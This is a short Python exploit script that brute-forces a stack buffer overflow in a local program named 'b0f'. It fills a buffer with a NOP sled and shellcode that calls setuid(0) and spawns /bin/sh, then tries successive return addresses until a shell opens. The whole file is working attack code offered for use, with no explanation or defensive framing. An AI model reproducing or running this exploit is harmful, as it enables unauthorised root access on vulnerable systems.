#!/usr/bin/env python

import os,sys,struct

size = 528       # buf size
ret = 0xbfbfffff # start ret

sh= "\x31\xc0\x50\x6a\x17\x50\xcd\x80\x31\xc0\x50\x68\x6e"
sh+="\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x50\x53"
sh+="\x6a\x3b\x50\xcd\x80\x31\xc0\x50\x6a\x01\x50\xcd\x80"

bufbase=""
i=0
while i<453:
 bufbase+= "\x90"
 i+=1
bufbase+=sh

while ret>0xbf700000:
  buf = bufbase
  i=0

  while i<18:
    buf+= struct.pack("<l",ret)
    i+=1

  buf+="\x0a"

  l = open("killer","w")
  l.write(buf)
  l.close()
  os.system("./b0f `cat killer`")

  ret-=400
  
# ooooooooo00000000000000W!!
